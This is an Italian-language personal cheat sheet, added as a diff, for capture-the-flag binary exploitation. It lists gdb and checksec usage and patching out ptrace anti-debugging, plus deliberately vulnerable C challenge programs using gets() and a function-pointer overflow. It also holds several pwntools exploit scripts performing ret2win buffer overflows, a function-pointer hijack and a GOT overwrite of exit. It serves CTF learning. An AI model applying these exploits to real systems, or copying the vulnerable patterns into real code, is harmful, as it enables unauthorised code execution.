@@ -1,0 +1,343 @@
+chmod +x ./file
+gdb ------------------------------------------
+b main 
+b *(decrypt_flag)+300
+x/s (char *) flag_buf
+x/s 0x5555554009d0 			# hex to string 
+printf "%c%c%c%c\n", 0x61, 0x62, 0x63, 0x64
+
+cheks
+info files -> architettura
+
+strings pogramma | grep "ZTIRPS"
+
+la variabile id ritorno di una funzoine e in 64(rax) 32(eax)
+
+Checksec (controlla livello di sicurezza del file)
+    "checksec --file=./binario" oppure "checksec file"
+
+    pwn checksec nomefile             /simile al comando file ma da piu dettagli sull' eseguibile
+    -Outputs di Checksec
+    1- Architettura file
+    2- RELRO                          /Relocation Read-Only (tecnica di mitigazione sui file binari)
+        - Partial RERO                /parte della GOT (Global Offset Table, caricamento dinamico indirizzi) è di sola lettura
+        - Full RERO                   /tutta la GOT è in sola lettura
+    3- CANARY                         /Controllo sul return della funzione chiamata che si accerta che riporti alla funzione precedente. (Un canary è un valore scritto proprio prima della funzione; se si usa un BO, allora il canary sarà riscritto
+    e l'overflow viene localizzato subito)
+    4- NX                             /Non-Executable La stack non è eseguibile (non si può eseguire shellcode sullo stack)
+    5- PIE                            /Position Independent Executable Indirizzi shiftati di uno stesso offset comune
+
+if a program have a antidebug controll
+_ptrace to check if there is a debugging (rax == -1). We can patch the call _ptrace instruction filling it with nops.
+
+
+run                                /per avviare il programma
+    breakpoint/b* funzione o indirizzo /imposta il breakpoint in un punto preciso
+    delete/d funzione o indirizzo      /cancella il breakpoint in un punto preciso
+    delete                             /cancella tutti i breakpoint
+    bt                                 /backtrace mostra le chiamate fatte finora dal programma
+    br *0xBD o br main                 /mette breakpoint su l indirizzo HEX passato
+    c                                  /continua l'esecuzione dal breakpoint in poi
+    jump printflag                     /salta alla funzione richiesta need br and run
+    clear main                         /toglie i breakpoint dalla funzione indicata
+    info registers (oppure i r)        /mostra i registri
+    info variables                     /mostra variabili
+    info locals                        /lista variabili locali
+    info breakpoints                   /lista tutti i breakpoint
+    info functions (oppure inf func)   /lista tutte le funzioni presenti nel file 
+
+    printf "%s", (char *) flag_buf 
+    oppure 
+    x/s (char *) flag_buf              /stampa una variabile come stringa
+    
+    disassemble/disas/disass funzione  /mostra assembly della funzione "funzione"
+
+    c                                  /continua dopo br
+    x/200bx $esp                       /mostra la stack, se non c'è esp usa rsp
+    r < a                              /da come input il file a (da usare con cyclic)
+    r < $(python -c "print('A'*50)")   /da come input il risultato dello script
+    set disassembly-flavor             /spesso usato per impostare la visualizzazione delle variabili
+    
+    pattern_create lunghezza file      /imposta un file con una stringa di lunghezza impostata; utile per trovare l'offset dello stack
+    run < nome_file_pattern            /esegue il file inserendo come input la stringa del pattern
+    (questo da eseguire dopo il run; si è all'interno dell'esecuzione del programma)
+    pattern_search                     /trova l'occorrenza del pattern nella memoria
+
+    Esempio di output:
+    "Register container pattern buffer:
+    EBP+0 found at offset: 136 
+    EIP+0 found at offset: 140 -> fine pattern (offset di 140)
+    oppure -> RBP+0 found at offset: 32 (offset di 32+8, per riallocazione indirizzo)
+
+    Register point to pattern buffer:
+    [ESP] --> offset 144 - size ~156
+    Pattern buffer found at: 
+    (stack)
+    References to pattern buffer found at:
+    (stack)"
+
+    pattern offset $eip                /per avere subito un'idea dell'offset da avere
+
+    shellcode generate                 /genera una serie di opzioni per la shellcode
+    (esempio di utilizzo)
+    shellcode generate x86/linux exec
+
+    set disassemble-next-line on       /mostra sempre il disassembly per la linea di codice che sta per essere eseguita
+    n                                  /mette un breakpoint "n" linee sotto alla corrente in esecuzione 
+    si                                 /step in; avanza l'esecuzione di un passo
+
+    bt                                 /backtrace - permette di vedere il call stack corrente, sapendo dove ritornano le funzioni
+
+    set follow-fork-mode child         /attacca il debugger ai processi figli 
+
+    shell cat tmp/flag.txt             /esegue un comando di shell dentro gdb
+
+    print (p) (variabile)              /stampa contenuti variabile
+    q                                  /necessario per uscire dal debugger
+
+Comandi utili
+    strings                            /mostra funzioni
+	info funcrions
+    file nome                          /mostra architettura (Ex:intel 80386) 
+    pwn cyclic 100 > a                 /crea un pattern lungo 100 dentro al file a
+    objdump -d file                    /mostra tutto il dump del codice
+    ltrace -f file                     /mostra chiamate di sistema (con -f fa vedere anche i processi figli)
+    strace -f file                     /alternativo al precedente con stesso scopo
+    grep -r --text 'picoCTF{.*}'       /trovare testo ricorsivamente
+    egrep -r --text 'picoCTF{.*?}      /alternativo al precedente con stesso scopo ma vede anche regex (espressioni regolari)
+    readelf -s filebinario             /permette di vedere simboli e funzioni
+    ldd <filename>                     /Librerie dinamiche caricate
+    nm <filename>                      /Simboli caricati nel file
+    cyclic <number>                    /Genera una sequenza di numeri per aiutare nei buffer overflow
+    Es. cyclic 50 | ./vuln
+    cyclic -l <lookup_value>           /Cerca la locazione di un valore nel pattern ciclico
+    dmesg                              /Esamina o controlla il kernel ring buffer e visualizzare messaggi (utile per capire dove ci sono errori/segfault)
+
+
+
+]
+
+buffer overflow  =======================
+py-----------------------
+
+#include<unistd.h>
+#include<stdio.h>
+#include<string.h>
+
+void print_flag(){
+	system("cat flag.txt");
+}
+
+int main(){
+	char josh[4];
+	char buffer[64];
+	setvbuf(stdout,NULL,_IONBF,0);
+	printf("How's the josh?\n");
+	gets(buffer);
+	if(memcmp(josh,"H!gh",4)==0) {
+		printf("Good! here's the flag\n");
+		print_flag();
+	} else {
+		printf("Your josh is low!\nBye!\n");
+	}
+	return 0;
+}
+
+/ architettura 32bit
+/ dobbiamo riempire josh ma noon possiamo ->
+/  lo facciamo con un overflow ->
+/   siccome lo stack si riempie dal alto verso il basso dobbiamo riempire prima le variabili in basso per raggiungere josh
+garbage = 'a' * 64 
+msg = 'H!gh' 
+msgin = garbage + msg 
+p = process('./pwn0') 
+p.sendline(msgin) 
+msgout = p.recvall() 
+print('output:\t', msgout) 
+
+
+/*
+
+ */
+
+#include <stdio.h>
+#include <string.h>
+#include <unistd.h>
+#include <stdlib.h>
+
+struct programmer_t
+{
+    char favourite_lang[32];
+    void (*call)();
+};
+typedef struct programmer_t programmer_t;
+
+void python()
+{
+    printf("Maybe you want a python shell...\n");
+    sleep(3);
+    execlp("/bin/sh", "/bin/sh", "-c", "echo 'python shell'", NULL);
+}
+
+void bash()
+{
+    printf("Opening bash shell...\n");
+    sleep(3);
+    printf("are you sure you don't prefer java?\n");
+    if(rand() != 328347) return;
+    // if only there was a way to jump here...
+    execlp("/bin/sh", "/bin/sh", NULL);
+}
+
+void nothing()
+{
+    execlp("/bin/sh", "/bin/sh", "-c", "", NULL);
+}
+
+
+int main(int argc, char** argv)
+{
+    programmer_t user = {0};
+    
+    printf("Enter your favourite programming language: ");
+    fflush(stdout);
+    int i = 0;
+    char c;
+    while ((c = getchar()) != '\n')
+        user.favourite_lang[i++] = c;
+    
+    if(!strncmp(user.favourite_lang, "java", 4)) {
+        printf("Just another Java noob...\n");
+    }
+    else if (!strncmp(user.favourite_lang, "python", 6)) {
+        user.call = python;
+    }
+    else if (!strncmp(user.favourite_lang, "bash", 4)) {
+        user.call = bash;
+    }
+    else {
+        user.call = nothing;
+    }
+    if(user.call) user.call();
+    return 0;
+}
+
+
+from pwn import *
+
+target_address = p64(0x4007a2) # convertire un numero (indirizzo) in 8 byte, nel formato giusto per l’architettura 64 bit.
+
+garbage = b'java' + b'a' * 28  # seleziono lalternativa java e riempio lo stack 
+msgin = garbage + target_address # aggiungo  lindirizzo  del punto  in qui voglio andare 
+
+p = process('./java')
+p.sendline(msgin)
+p.interactive()
+
+
+-------------------------------------------------------------------------------------------------
+from pwn import *
+
+p = process('./pwn1')
+
+offset = 140
+shell_addr = 0x080484ad
+
+payload = b"A"*offset + p32(shell_addr)
+
+p.sendline(payload)
+p.interactive()
+----------------------
+from pwn import *
+elf = ELF('./pwn1')
+
+ofs = 140
+
+pay = b'a' * ofs
+
+pay += p32(elf.symbols['shell'])
+p= process('./pwn1')
+p.sendline(pay)
+p.interactive()
+
+
+-----------------------------------------------------------------------------------------------------------
+
+
+from pwn import *          # Importa pwntools (libreria per exploit binari)
+
+# Carica il file ELF del programma vulnerabile
+# Serve per leggere simboli, indirizzi di funzioni, sezioni, ecc.
+elf = ELF('./hi')
+
+# Offset necessario per arrivare al return address
+# (trovato con pattern / debugger)
+offset = 40
+
+# Crea la parte "spazzatura" del payload:
+# 40 byte qualsiasi per riempire buffer + saved RBP
+payload = b'A' * offset
+
+# Aggiunge l'indirizzo della funzione print_flag
+# p64 converte l'indirizzo in formato little-endian (64 bit)
+payload += p64(elf.symbols['print_flag']) ------------------------>  va  dritto  alla indirizzo della funzione
+
+# Avvia il processo locale del programma vulnerabile
+p = process('./hi')
+
+# Invia il payload come input (terminato da newline)
+# Questo sovrascrive il return address
+p.sendline(payload)
+
+# Riceve TUTTO l'output del programma fino alla fine
+# (inclusa la stampa della flag)
+print(p.recvall().decode())
+
+
+-----------------------------------------------------GOT overwrite -> quando ce una funzione che mi da la flag e non viene richiamata (possibile con RelRO assente/parziale)
+from pwn import *
+
+# Serve per leggere simboli, indirizzi di funzioni, GOT, ecc.
+elf = ELF('./NeedsToBeHappy')
+
+# Avvia il processo locale del programma vulnerabile
+p = process('./NeedsToBeHappy')
+
+# ──────────────────────────────
+# Primo input: scelta iniziale
+# ──────────────────────────────
+# Il programma chiede probabilmente una conferma (y/n)
+p.sendline(b'y')
+
+# ──────────────────────────────
+# Secondo input: indirizzo della funzione da chiamare
+# ──────────────────────────────
+# Recupera l'indirizzo della funzione give_the_man_a_cat
+# (funzione "win")
+func_addr = elf.functions['give_the_man_a_cat'].address
+
+# Invia l'indirizzo come NUMERO ASCII
+# → il programma lo leggerà con scanf / strtol
+p.sendline(str(func_addr).encode())
+
+# ──────────────────────────────
+# Terzo input: indirizzo da sovrascrivere
+# ──────────────────────────────
+# Recupera l'indirizzo della GOT entry di exit
+# → quando exit verrà chiamata, verrà dirottata
+exit_got = elf.got['exit']
+
+# Anche questo viene inviato come numero ASCII
+p.sendline(str(exit_got).encode())
+
+# ──────────────────────────────
+# Interazione finale
+# ──────────────────────────────
+# A questo punto, quando il programma chiama exit(),
+# il flusso va direttamente a give_the_man_a_cat
+p.interactive()
+
+
+
+
+
